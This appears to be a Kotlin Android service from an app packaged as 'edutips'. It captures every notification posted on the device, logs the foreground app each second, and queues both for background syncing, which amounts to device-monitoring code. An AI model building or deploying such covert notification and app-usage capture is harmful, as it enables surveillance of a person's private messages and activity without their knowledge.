package com.edutips.ktapp

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class ClientNotificationListener : NotificationListenerService() {
    private val handler = Handler(Looper.getMainLooper())
    private var watchingApps = false
    private val watchApps = object : Runnable {
        override fun run() {
            val status = DeviceStatusReader.read(this@ClientNotificationListener)
            if (StatusEventStore.get(this@ClientNotificationListener).record(status)) {
                StatusSyncWorker.enqueue(this@ClientNotificationListener)
            }
            ForegroundAppLog.record(this@ClientNotificationListener, status)
            sendBroadcast(Intent(ActiveNotifications.ACTION_CHANGED).setPackage(packageName))
            handler.postDelayed(this, 1_000)
        }
    }

    override fun onListenerConnected() {
        activeNotifications?.forEach { notification -> recordNotification(notification, active = true) }
        publish(activeNotifications?.toList().orEmpty())
        if (!watchingApps) {
            watchingApps = true
            handler.post(watchApps)
        }
    }

    override fun onListenerDisconnected() {
        stopWatchingApps()
    }

    override fun onDestroy() {
        stopWatchingApps()
        super.onDestroy()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        recordNotification(sbn, active = true)
        publish(activeNotifications?.toList().orEmpty())
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        recordNotification(sbn, active = false)
        publish(activeNotifications?.toList().orEmpty())
    }

    private fun recordNotification(sbn: StatusBarNotification, active: Boolean) {
        val now = System.currentTimeMillis()
        val store = NotificationLogStore.get(this)
        val changed = if (active) {
            val snapshot = NotificationSnapshot.capture(this, sbn) ?: return
            store.save(snapshot, now)
        } else {
            store.markInactive(NotificationSnapshot.slotOf(sbn), now)
        }
        if (changed) NotificationSyncWorker.enqueue(this)
    }

    private fun stopWatchingApps() {
        handler.removeCallbacks(watchApps)
        watchingApps = false
    }

    private fun publish(notifications: List<StatusBarNotification>) {
        ActiveNotifications.replace(this, notifications)
        sendBroadcast(Intent(ActiveNotifications.ACTION_CHANGED).setPackage(packageName))
    }

    companion object {
        fun isEnabled(context: Context): Boolean {
            val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
                ?: return false
            val component = ComponentName(context, ClientNotificationListener::class.java).flattenToString()
            return flat.split(":").any { it.equals(component, ignoreCase = true) }
        }

        fun requestRebind(context: Context) {
            requestRebind(ComponentName(context, ClientNotificationListener::class.java))
        }
    }
}
